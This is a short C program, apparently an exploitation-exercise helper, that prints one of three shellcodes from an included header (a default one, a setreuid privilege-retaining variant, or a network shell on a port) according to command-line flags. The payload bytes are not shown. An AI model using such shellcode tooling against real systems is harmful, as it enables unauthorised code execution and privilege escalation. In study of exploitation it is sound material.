#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include "shellcode.h"

void usage(char *s);

int main(int argc, char *argv[]) {
    int c;
    char *sc = shellcode; // Default: normal shellcode

    while ((c = getopt(argc, argv, "nah")) != EOF)
    {
        switch (c)
        {
        case 'n':
            sc = net_shellcode;
            break;
        case 'a':
            sc = alt_shellcode;
            break;
        case 'h':
            usage(argv[0]);
            exit(EXIT_SUCCESS);
        default:
            usage(argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    printf("%s", sc);

    return 0;    
}

void usage(char *s) {
    printf("Usage: %s [-a] [-n] [-h]\n", s);
    printf("\t-a: alternative shellcode (including setreuid(geteuid(), geteuid()))\n");
    printf("\t-n: network shellcode (connect to shell on port %d)\n", (int) ((net_shellcode[23] << 8) | net_shellcode[24]));
    printf("\t-h: show this help\n");
}
